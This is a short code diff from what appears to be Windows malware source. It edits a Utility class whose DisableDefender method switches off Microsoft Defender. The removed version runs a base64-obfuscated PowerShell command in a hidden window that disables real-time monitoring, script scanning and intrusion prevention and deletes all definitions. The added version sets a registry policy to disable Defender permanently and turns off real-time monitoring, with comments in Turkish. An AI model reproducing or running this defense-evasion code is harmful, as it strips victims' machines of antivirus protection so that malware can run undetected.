@@ -235,8 +235,12 @@ class Utility:
 
     @staticmethod
     def DisableDefender() -> None:
-        command = base64.b64decode(b'cG93ZXJzaGVsbCAtdmVyc2lvbiAyIC1Db21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZDsgJiBcIiRlbnY6UHJvZ3JhbUZpbGVzXFdpbmRvd3MgRGVmZW5kZXJcTXBDbWRSdW4uZXhlXCIgLVJlbW92ZURlZmluaXRpb25zIC1BbGwi').decode(errors='ignore')
-        subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+        # Registry yolu ile kalıcı olarak devre dışı bırakma
+        reg_cmd = 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
+        subprocess.run(reg_cmd, shell=True, capture_output=True)
+        # Real-time protection kapatma (geçici)
+        rt_cmd = 'powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"'
+        subprocess.run(rt_cmd, shell=True, capture_output=True)
 
     @staticmethod
     def ExcludeFromDefender(path: str=None) -> None:
